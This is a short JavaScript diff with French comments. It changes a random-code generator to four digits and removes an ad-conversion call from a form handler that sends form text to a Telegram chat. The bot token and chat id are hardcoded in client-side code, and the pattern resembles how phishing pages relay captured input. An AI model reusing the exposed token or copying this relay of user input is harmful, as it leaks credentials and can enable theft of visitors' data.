@@ -4,14 +4,9 @@ function generateRandomCode() {
 
     let code = '';
 
-    // Ajouter trois lettres aléatoires
-    for (let i = 0; i < 3; i++) {
-        const randomIndex = Math.floor(Math.random() * randomLetters.length);
-        code += randomLetters.charAt(randomIndex);
-    }
 
     // Ajouter trois chiffres aléatoires
-    for (let i = 0; i < 3; i++) {
+    for (let i = 0; i < 4; i++) {
         const randomIndex = Math.floor(Math.random() * randomNumbers.length);
         code += randomNumbers.charAt(randomIndex);
     }
@@ -61,7 +56,7 @@ form.addEventListener("submit", (e) => {
         var token = "6022740417:AAFnC9vt8m4oGNGvWCcXMZxsFC6CQ6zQbi4";
         var chat_id = -4057359205;
         var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
-        gtag('event', 'conversion', {'send_to': 'AW-11274013815/Z12XCIG30YgZEPeY7_8p'});    
+         
 
         let api = new XMLHttpRequest();
         api.open("GET", url, true);
